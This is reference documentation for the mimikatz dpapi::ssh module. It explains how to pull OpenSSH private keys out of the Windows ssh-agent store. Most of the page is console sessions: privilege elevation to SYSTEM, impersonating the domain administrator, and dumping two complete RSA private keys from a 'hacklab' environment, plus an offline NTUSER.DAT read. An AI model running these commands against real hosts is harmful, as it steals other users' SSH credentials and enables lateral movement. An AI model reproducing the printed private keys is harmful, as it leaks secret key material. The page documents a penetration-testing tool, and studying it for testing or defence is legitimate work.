# ssh

`dpapi::ssh` extracts OpenSSH private keys. More information for the extraction of the SSH keys from a Windows host can be found on this [link](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/). It has the following command line arguments:

* `/hive`: it is the path to the `NTUSER.DAT` file
* `/impersonate`: impersonates a user and extracts the SSH private key for this user
* `/password`: the password to decrypt the ssh credentials
* `/masterkey`: the masterkey to use for decryption. It can be obtained through [`sekurlsa::dpapi`](https://tools.thehacker.recipes/mimikatz/modules/sekurlsa/dpapi).
* `/unprotect`: display the decryption results on screen

```
mimikatz # dpapi::ssh /unprotect
.DEFAULT
S-1-5-19
S-1-5-20
S-1-5-21-2725560159-1428537199-2260736313-1730

   [SHA256:pW1qqDIYHA2GxjkBEVQmyEOBdkBUTkAsOfGEPf0WSFQ]
     comment: hacklab\m3g9tr0n@Win10
     type   : 0
 * using CryptUnprotectData API
-----BEGIN RSA PRIVATE KEY-----
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
-----END RSA PRIVATE KEY-----
S-1-5-18
```

When attempting to extract SSH keys of other users, the following will be encountered:

```
mimikatz # token::elevate
Token Id  : 0
User name :
SID name  : NT AUTHORITY\SYSTEM

708     {0;000003e7} 1 D 42449          NT AUTHORITY\SYSTEM     S-1-5-18        (04g,21p)       Primary
 -> Impersonated !
 * Process Token : {0;007fb506} 2 F 15102252    hacklab\m3g9tr0n        S-1-5-21-2725560159-1428537199-2260736313-1730  (12g,24p)       Primary
 * Thread Token  : {0;000003e7} 1 D 16619685    NT AUTHORITY\SYSTEM     S-1-5-18        (04g,21p)       Impersonation (Delegation)

mimikatz # dpapi::ssh /unprotect
.DEFAULT
S-1-5-19
S-1-5-20
S-1-5-21-2725560159-1428537199-2260736313-1730
S-1-5-21-2725560159-1428537199-2260736313-500

   [SHA256:OmRs8aVrYuq7716nNnycEBwE2+2OMy/1o3APZbUvAUk]
     comment: hacklab\administrator@Win10
     type   : 0
 * using CryptUnprotectData API
ERROR kuhl_m_dpapi_unprotect_raw_or_blob ; NTE_BAD_KEY_STATE, needed Masterkey is: {63af0bf3-36e4-4246-9526-05bb3938ed46}
S-1-5-18
```

This is where the `/impersonate` argument comes in handy:

```
mimikatz # dpapi::ssh /unprotect /impersonate
.DEFAULT
S-1-5-19
S-1-5-20
S-1-5-21-2725560159-1428537199-2260736313-500
 * Trying to get an impersonation token for S-1-5-21-2725560159-1428537199-2260736313-500:    {0;00f046ac} 2 D 17435183         hacklab\Administrator   S-1-5-21-2725560159-1428537199-2260736313-500   (25g,24pImpersonation (Delegation)

   [SHA256:OmRs8aVrYuq7716nNnycEBwE2+2OMy/1o3APZbUvAUk]
     comment: hacklab\administrator@Win10
     type   : 0
 * using CryptUnprotectData API
-----BEGIN RSA PRIVATE KEY-----
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
-----END RSA PRIVATE KEY-----
S-1-5-18
```

The following is an offline extract example:

```
mimikatz # dpapi::ssh /hive:C:\Users\Administrator\NTUSER.DAT

   [SHA256:OmRs8aVrYuq7716nNnycEBwE2+2OMy/1o3APZbUvAUk]
     comment: hacklab\administrator@Win10
     type   : 0
```
